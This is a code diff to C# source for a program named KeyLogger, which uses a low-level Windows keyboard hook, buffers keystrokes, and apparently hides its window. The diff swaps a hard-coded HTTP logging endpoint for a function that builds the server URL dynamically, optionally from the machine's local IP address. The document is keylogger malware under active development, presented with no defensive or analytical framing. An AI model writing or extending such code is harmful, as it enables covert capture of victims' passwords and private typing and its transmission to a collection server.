@@ -8,7 +8,7 @@ using System.Windows.Forms;
 
 class KeyLogger
 {
-    private const string URL = "http://127.0.0.1:2000/log"; // Change this based on the dynamically updated URL in the payload
+    private static string URL = GetServerUrl();  // Dynamically updated server URL
     private const int WH_KEYBOARD_LL = 13;
     private const int WM_KEYDOWN = 0x0100;
     private static StringBuilder buffer = new StringBuilder();
@@ -123,4 +123,28 @@ class KeyLogger
 
     [DllImport("user32.dll")]
     private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+    private static string GetServerUrl()
+    {
+        string ipAddress = "localhost";  // Default to local IP
+        bool forwarded = false;  // Set this flag to true if you want to use the forwarded IP
+        if (forwarded)
+        {
+            ipAddress = GetLocalIPAddress();  // Dynamically get the local machine IP
+        }
+        return $"http://{ipAddress}:2000/log";  // Construct URL dynamically
+    }
+
+    private static string GetLocalIPAddress()
+    {
+        var host = Dns.GetHostEntry(Dns.GetHostName());
+        foreach (var ip in host.AddressList)
+        {
+            if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
+            {
+                return ip.ToString();
+            }
+        }
+        return "localhost";  // Return localhost if no IP is found
+    }
 }
